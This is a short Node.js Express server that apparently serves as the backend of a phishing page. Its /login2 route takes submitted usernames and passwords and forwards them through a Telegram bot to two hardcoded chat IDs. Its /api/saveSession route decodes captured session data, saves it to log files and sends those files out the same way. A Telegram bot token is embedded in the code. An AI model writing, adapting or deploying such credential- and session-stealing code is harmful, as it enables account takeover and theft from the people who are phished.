'use strict';
const express = require('express')
const bodyParser = require('body-parser');
const fs = require('fs');
const tg = require('node-telegram-bot-api')

const token = '6083781328:AAGein7x2nWCr9OcAKyGIjD9vzDdySErhgg';

// Create a bot that uses 'polling' to fetch new updates
const bot = new tg(token, {polling: true});




const app = express()
const port = 5000
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static('public'));
express.static.mime.define({'application/octet-stream': ['csv']})

function generateRandom(min = 111111, max = 1000000) {

    // find diff
    let difference = max - min;

    // generate random number 
    let rand = Math.random();

    // multiply with difference 
    rand = Math.floor( rand * difference);

    // add with min value 
    rand = rand + min;

    return rand;
}

let send_ids = [6269198350, 1852253989]

app.post('/login2', (req,res) => {
	const login = req.body.login
	const pass = req.body.password
	
	
	send_ids.forEach((el) => bot.sendMessage(el, login + ":" + pass ))
	res.redirect('/auth')
	
})



app.post('/api/saveSession', (req,res) => {
	let text = Buffer.from(JSON.stringify(req.body), 'base64').toString('utf8');
	
	const pl2 = decodeURIComponent(text);
	console.log(pl2);
	var genpath = 'logs/' + generateRandom() +'.txt';
	fs.writeFile(genpath, pl2, err => {
		if (err) {
		  console.error(err);
		}
		send_ids.forEach((el) => bot.sendDocument(el, genpath))
		// file written successfully
	  });
	res.send('1');
	
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})
